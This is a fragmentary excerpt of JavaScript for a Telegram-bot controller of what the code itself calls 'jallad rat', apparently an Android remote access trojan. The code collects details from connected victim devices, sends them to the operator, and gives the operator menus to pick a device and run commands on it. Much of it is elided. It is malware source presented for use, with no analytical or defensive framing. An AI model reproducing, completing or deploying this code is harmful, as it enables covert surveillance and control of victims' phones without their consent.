...
appSocket.on('connection', (ws, req) => {
    ...
    appBot.sendMessage(id,
        ...
        `• 𝐒𝐜𝐫𝐞𝐞𝐧 𝐛𝐫𝐢𝐠𝐡𝐭𝐧𝐞𝐬𝐬  : <b>${brightness}</b>\n` +
        `• 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐫 : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
...
appBot.on('message', (message) => {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗷𝗮𝗹𝗹𝗮𝗱 𝗿𝗮𝘁\n\n' +
                '• 𝗶𝘁'𝘀 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 \n\n' +
                '• 𝗶𝘁'𝘀 𝘄𝗼𝗿𝗸 𝘁𝗶𝗹𝗹 𝗶𝗻𝘀𝘁𝗮𝗹𝗹 𝗔𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻 \n\n' +
                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
                '• 𝗜𝗙 𝗬𝗢𝗨 𝗝𝗔𝗟𝗟𝗔𝗗 𝗥𝗔𝗧 𝗦𝗧𝗔𝗥𝗧 /start ᴄᴏᴍᴍᴀɴᴅ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
        ...
        appBot.sendMessage(id, '°• BHAKK BC ON KREGA ')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    ...
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝐒𝐞𝐥𝐞𝐜𝐭 𝐜𝐨𝐦𝐦𝐞𝐧𝐝 𝐨𝐟 𝐝𝐞𝐯𝐢𝐜𝐞 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        ...
                        {text: '𝐝𝐞𝐯𝐢𝐜𝐞 𝐢𝐧𝐟𝐨', callback_data: `device_info:${uuid}`}
                    ],
                    [
